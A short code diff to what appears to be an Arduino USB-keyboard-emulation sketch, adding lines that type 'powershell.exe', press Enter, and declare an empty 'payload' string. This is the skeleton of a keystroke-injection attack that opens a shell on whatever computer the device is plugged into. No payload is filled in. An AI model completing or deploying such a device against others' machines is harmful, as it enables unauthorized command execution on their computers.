@@ -21,6 +21,14 @@ void loop() {
       delay(500);
       keyboard.releaseAll();
       delay(1000);
+      keyboard.print("powershell.exe");
+      delay(100);
+      keyboard.press(KEY_RETURN);
+      delay(100);
+      keyboard.releaseAll();
+      delay(1000);
+      const char* payload="";
+
     }
   }
   
